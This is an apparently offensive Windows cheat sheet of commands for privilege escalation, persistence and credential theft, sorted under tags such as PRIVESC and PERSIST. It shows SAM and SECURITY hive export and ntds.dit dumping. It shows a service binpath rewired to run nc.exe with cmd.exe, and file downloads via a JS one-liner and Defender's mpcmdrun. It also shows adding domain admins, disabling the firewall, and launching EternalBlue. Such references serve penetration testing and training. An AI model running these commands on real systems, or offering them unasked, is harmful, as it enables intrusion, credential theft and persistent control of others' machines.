# windows

#plateform/windows #target/local #cat/PRIVESC

## get info system
```
systeminfo
```

## get info system limited
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

## find passwords
```
findstr /si 'password' *.txt *.xml *.docx
```

## find passwords - group policy preference (ms14-025)
```
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

## get patches
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## get hostname
```
hostname
```

## get computer name
```powershell
$env:computername
```

## show environment - List all environment variables
```
set
```

## dns request for DC
```
nslookup -type=any <userdnsdomain>.
```

## show mounted disks
```
wmic logicaldisk get caption,description,providername
```

## show recycle bin
```
dir C:\$Recycle.Bin /s /b
```

## get architecture
```
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

## list scheduled tasks
```
schtasks /query /fo LIST /v
```

## list one scheduled task
```
schtasks /query /fo LIST 2>nul | findstr <taskname>
```

## list process
```
tasklist /V
```

## list process and links to started services
```
tasklist /SVC
```

## list windows service started (1)
```
net start
```

## list services (2)
```
wmic service list brief
```

## list services (3)
```
sc query
```

## list installed software (1)
```
dir /a "C:\Program Files"
```

## list installed software (2)
```
dir /a "C:\Program Files (x86)"
```

## list installed software (3)
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

## show lsa cached credentials value
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## register query word password (1)
```
reg query HKLM /f password /t REG_SZ /s
```

## register query word password (2)
```
reg query HKCU /f password /t REG_SZ /s
```

## register query extract SAM

When the Windows operating system is running, the hives are in use and mounted. The command-line tool named reg can be used to export them.

```
reg save HKLM\SAM 'C:\Windows\Temp\sam.save'
reg save HKLM\SECURITY 'C:\Windows\Temp\security.save'
reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'
```

## create shadow copy
```
wmic shadowcopy call create Volume='C:\'
```

## list shadow copy
```
vssadmin list shadows
```

## check service privilege
```
accesschk.exe /accepteula -ucqv <service_name>
```

## reconfigure service
```
sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
```

## change service
```
sc config <service> obj= ".\LocalSystem" password= ""
```

## start service
```
net start <service>
```

## check permission (1)
```
accesschk.exe /accepteula -dqv "<file>"
```

## check permission (2)
```
cacls "<file>"
```

## find weak folder permission
```
accesschk.exe -uwdqs Users <c>:\
```

## find weak file permission
```
accesschk.exe -uwqs Users <c>:\
```

% windows, download

## VBS download file script
#cat/ATTACK/FILE_TRANSFERT
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
```

% windows, users

## add user
#cat/PERSIST
```
net user <username> <password> /ADD
```

## add user to domain
#cat/PERSIST
```
net user <username> <password> /ADD /DOMAIN
```

## add user as admin
#cat/PERSIST
```
net localgroup administrators <username> /add
```

## run as over user
#cat/PRIVESC
```
runas /user:<domain>\<user> cmd.exe
```

## whoami - All info about me, take a look at the enabled tokens
#cat/PRIVESC
```
whoami /all
```

## whoami privilegied
#cat/PRIVESC
```
whoami /priv
```

## list all users
#cat/PRIVESC
```
net users
```

## list domain admins (fr)
#plateform/windows  #target/local #cat/RECON
```
net group "Admins du domaine"
```

## infos about a user
#cat/RECON
```
net user <username>
```

## infos on a Administrator and retrieve SID
```powershell
[wmi] "Win32_userAccount.Domain='<computer_name>',Name='Administrator'"
```

## infos about password policy
#cat/RECON
```
net accounts
```

## who logged in
#cat/PRIVESC
```
qwinsta
```

## List credentials
#cat/POSTEXPLOIT/CREDS_RECOVER
```
cmdkey /list
```

## show local groups
#cat/RECON
```
net localgroup
```

## show specific local group
```
net localgroup <group_name>
```

## show domain group users
```
net group /domain <domain_group_name>
```

% windows, domain infos

## get domain name
```
echo %USERDOMAIN%
```

## get domain name (2)
```
echo %USERDNSDOMAIN%
```

## get computer domain name (3)
```
systeminfo | findstr /B /C:"Domain"
```

## get name of the DC
```
echo %logonserver%
```

## get name of the dc (2)
```
set logonserver #Get name of the domain controller
```

## list of domain groups
```
net group /domain
```

## list of computer connected to the domain
```
net group "domain computers" /domain
```

## List all PCs of the domain
```
net view /domain
```

## list domain controllers
```
nltest /dclist:<domain>
```

## list pc accounts of domain controllers
```
net group "Domain Controllers" /domain
```

## List users with domain admin privileges
```
net group "Domain Admins" /domain
```

## Add user to domain admin group
```
net group "Domain Admins" <username> /add /domain
```

## Add user to domain admin group - FR
```
net group "Admins du domaine" <username> /add /domain
```

## List users that belongs to the administrators group inside the domain
```
net localgroup administrators /domain
```

## List all domain users
```
net user /domain
```

## get user domain information
```
net user <username> /domain
```

## domain password and lockout policy
```
net accounts /domain
```

## get mapping of the trust relationships
```
nltest /domain_trusts
```

% windows, network
## all interfaces
```
ipconfig /all
```

## print all routes
```
route print
```

## list of know hosts
```
arp -a
```

## list open ports
```
netstat -ano
```

## show hosts file
```
type C:\WINDOWS\System32\drivers\etc\hosts
```

% windows, dir

## list hidden files
```
dir /a:h <path>
```

## Recursive list
```
dir /s /b
```

% windows, firewall
## show firewall state
```
netsh firewall show state
```

## show firewall config
```
netsh firewall show config
```

## turn off firewall
```
netsh Advfirewall set allprofiles state off
```

## turn off firewall (2)
```
netsh firewall set opmode disable
```

## turn on firewall
```
netsh Advfirewall set allprofiles state on
```

## firewall open port RDP
```
netsh firewall add portopening TCP 3389 "Remote Desktop"
```

% windows, ntds.dit
## dump ntds.dit (Windows >= 2008 server) - method 1
```
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
## dump ntds.dit (Windows >= 2008 server) - method 2
```
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```
## dump ntds.dit (Windows <= 2003 server)
```
net start vss && vssadmin create shadow /for=c: && vssadmin list shadows && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\temp
```

% windows, smb, share
## list of computer
```
net view
```

## list of computer shares on the domain
```
net view /all /domain <domain_name>
```

## list share of a computer
```
net view \\<ip> \ALL
```

## mount share locally
```
net use x: \\<ip>\<share_name>
```

## check current share
```
net share
```

% windows, file, download
## windows download file with windows defender
```
"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe" -DownloadFile -url <url> -path <result_file>
```

## windows download file with windows defender
```
mpcmdrun.exe -DownloadFile -url <url> -path <result_file>
```

% windows, active directory, dns

## find AD IP - show domain name and dns
```
nmcli dev show <interface>
```

## nslookup AD - domain
```
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain_name>
```

% windows, active directory

## enable sid history
Enable history on source domain for target domain (useful for forest extra SID exploitation)
```
netdom trust <source_domain> /d:<target_domain> /enablesidhistory:yes
```

% windows, cve
## windows eternal blue - smb - ms17-010
```
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
```

= interface: eth0
